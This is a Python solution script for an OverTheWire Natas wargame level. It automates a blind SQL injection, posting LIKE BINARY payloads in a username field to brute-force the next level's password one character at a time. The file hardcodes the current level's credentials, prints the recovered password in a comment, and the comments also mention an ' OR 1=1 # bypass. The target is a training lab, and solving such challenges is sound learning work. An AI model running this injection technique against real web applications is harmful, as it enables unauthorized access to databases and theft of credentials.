#!/usr/bin/env python

import requests

username = "natas15"
password = "AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J"

url = "http://%s.natas.labs.overthewire.org/index.php?debug" % username
session = requests.Session()

# those are the valid letters in each password
letters = "0123456789"
for x in range(65, 91):
    letters += chr(x)
for x in range(97, 123):
    letters += chr(x)

# print(letters)

# next we need to brute force the password to see
# if a certain char exists in the password,
# but for the first time, we just want to know the chars not thier positions

pass_length = len(password)
pass_filter = ""
passwd = ""

for char in letters:
    sqli = 'natas16" and password LIKE BINARY "%' + char + '%" #'
    post_data = {"username": sqli}
    response = session.post(url, data=post_data, auth=(username, password))
    content = response.text
    if "exists" in content:
        pass_filter += char

print(pass_filter)

# next idea is to figure out the correct position of each char in the passwd

for i in range(pass_length):
    for char in pass_filter:
        sqli = 'natas16" and password LIKE BINARY "' + passwd + char + '%" #'
        post_data = {"username": sqli}
        response = session.post(url, data=post_data, auth=(username, password))
        content = response.text
        if "exists" in content:
            passwd += char
            break

# it takes some and it should it still a brute force method after all ^_^
print(passwd)  # WaIHEacj63wnNIBROHeqi3p9t0m5nhmh

# response = session.post(url, auth=(username, password))
# content = response.text
# soup = BeautifulSoup(content,"html.parser")

# print (soup)
# print content

# let's view the source
# it's clearly looks like a SQLi challenge, so let's try to break and fix
# after some try, { " OR 1=1 # } this query gets us an access,
# but without showing the credientials, so it might be a blind sqli challenge
# from the /index-source.html, we know that the database name is natas15
# and the table name is users
# we have a /index.php?debug that shows us the message
# if the user exists or not

